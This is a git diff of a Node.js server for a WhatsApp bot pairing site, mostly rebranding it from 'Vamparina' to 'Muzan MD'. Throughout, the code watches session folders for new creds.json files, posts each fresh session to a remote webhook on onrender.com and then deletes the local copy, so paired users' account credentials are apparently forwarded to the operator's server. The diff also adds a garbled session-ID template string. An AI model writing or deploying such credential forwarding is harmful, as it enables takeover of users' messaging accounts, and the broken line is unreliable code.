@@ -22,7 +22,7 @@ import('events').then(events => {
 // === YOUR MAIN BOT WEBHOOK (CHANGE ONLY IF YOU DEPLOY NEW ONE) ===
 const MAIN_BOT_WEBHOOK = "https://vamparina-v1-5.onrender.com/vamparina-activate";
 
-// === AUTO SEND SESSION TO MAIN BOT (THE MAGIC FUNCTION) ===
+// === AUTO SEND SESSION TO MAIN BOT ===
 async function autoActivateBot(sessionDir) {
     try {
         if (!fs.existsSync(sessionDir)) return;
@@ -46,7 +46,7 @@ async function autoActivateBot(sessionDir) {
             } catch {}
         }
 
-        const sessionId = `auto_${phone}_${Date.now()}`;
+        const sessionId = `muzan_\( {phone}_ \){Date.now()}`;
 
         const payload = {
             sessionId,
@@ -61,7 +61,7 @@ async function autoActivateBot(sessionDir) {
         });
 
         if (response.ok) {
-            console.log(`BOT AUTO-ACTIVATED → ${phone} | Session: ${sessionId}`);
+            console.log(`✅ MUZAN MD AUTO-ACTIVATED → ${phone} | Session: ${sessionId}`);
         } else {
             console.log("Failed to activate bot on main server");
         }
@@ -77,7 +77,7 @@ app.use(express.static(__dirname));
 
 // === ROUTES ===
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'pair.html'));
+    res.sendFile(path.join(__dirname, 'pair.html')); // or index.html
 });
 
 // Pairing code route
@@ -86,12 +86,11 @@ app.use('/pair', pairRouter);
 // QR code route
 app.use('/qr', qrRouter);
 
-// === NEW: AUTO-CLEANUP & AUTO-ACTIVATION MONITOR ===
-// This watches both session folders and activates bots automatically
+// === AUTO-CLEANUP & AUTO-ACTIVATION MONITOR ===
 function startSessionWatcher() {
     const sessionsToWatch = ['./session_', './qr_sessions/session_'];
 
-    console.log("AUTO-ACTIVATION MONITOR STARTED");
+    console.log("🔄 MUZAN MD AUTO-ACTIVATION MONITOR STARTED");
 
     setInterval(() => {
         sessionsToWatch.forEach(basePath => {
@@ -106,12 +105,11 @@ function startSessionWatcher() {
                         const stats = fs.statSync(credsPath);
                         const age = Date.now() - stats.mtimeMs;
 
-                        // If creds.json exists and is recent → session is ready
                         if (age < 60000) { // Less than 60 seconds old
                             console.log(`New session detected: ${dir}`);
                             autoActivateBot(dir);
 
-                            // Optional: Clean up after 30 seconds
+                            // Clean up after 30 seconds
                             setTimeout(() => {
                                 fs.remove(dir).catch(() => {});
                             }, 30000);
@@ -131,14 +129,14 @@ const PORT = process.env.PORT || 8000;
 app.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════╗
-║        VAMPARINA V1 LINKER           ║
+║         MUZAN MD LINKER              ║
 ║        AUTO-ACTIVATION ENABLED       ║
 ╚══════════════════════════════════════╝
-YouTube: @arnoldkipruto-qn7jn
-GitHub: @arnold6001
+
+Owner: Arnold Der Abenteurer
 Main Bot: ${MAIN_BOT_WEBHOOK}
 
-Server running → http://localhost:${PORT}
+Server running on → http://localhost:${PORT}
     `);
 });
 
